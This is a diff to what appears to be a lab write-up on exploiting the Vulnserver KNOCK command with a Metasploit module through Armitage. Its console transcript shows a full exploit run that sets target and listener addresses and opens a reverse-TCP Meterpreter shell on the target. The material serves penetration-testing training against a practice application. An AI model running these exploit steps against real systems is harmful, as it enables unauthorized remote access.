@@ -138,7 +138,7 @@ msf6 exploit(windows/vulnserver/knock) > exploit -j
 
 Here is what happens (armitage shows in the exploit window) when using the knock module with selecting *Use a reverse connection*
 ```
-use exploit/windows/vulnserver/knock
+msf6 > use exploit/windows/vulnserver/knock
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf6 exploit(windows/vulnserver/knock) > set RHOSTS 192.168.1.19
 RHOSTS => 192.168.1.19
@@ -146,19 +146,20 @@ msf6 exploit(windows/vulnserver/knock) > set TARGET 0
 TARGET => 0
 msf6 exploit(windows/vulnserver/knock) > set LHOST 192.168.1.4
 LHOST => 192.168.1.4
-msf6 exploit(windows/vulnserver/knock) > set LPORT 13421
-LPORT => 13421
+msf6 exploit(windows/vulnserver/knock) > set LPORT 9387
+LPORT => 9387
 msf6 exploit(windows/vulnserver/knock) > set PAYLOAD windows/meterpreter/reverse_tcp
 PAYLOAD => windows/meterpreter/reverse_tcp
 msf6 exploit(windows/vulnserver/knock) > set RPORT 9999
 RPORT => 9999
 msf6 exploit(windows/vulnserver/knock) > exploit -j
-[*] Exploit running as background job 3.
+[*] Exploit running as background job 1.
 [*] Exploit completed, but no session was created.
-[*] Started reverse TCP handler on 192.168.1.4:13421 
+[*] Started reverse TCP handler on 192.168.1.4:9387 
 [*] 192.168.1.19:9999 - Connecting to target...
 [*] 192.168.1.19:9999 - Trying target vulnserver-KNOCK...
 [*] Sending stage (175174 bytes) to 192.168.1.19
+[*] Meterpreter session 1 opened (192.168.1.4:9387 -> 192.168.1.19:49775 ) at 2022-06-12 18:53:35 -0400
 ```
 ### Meterpreter commands
 
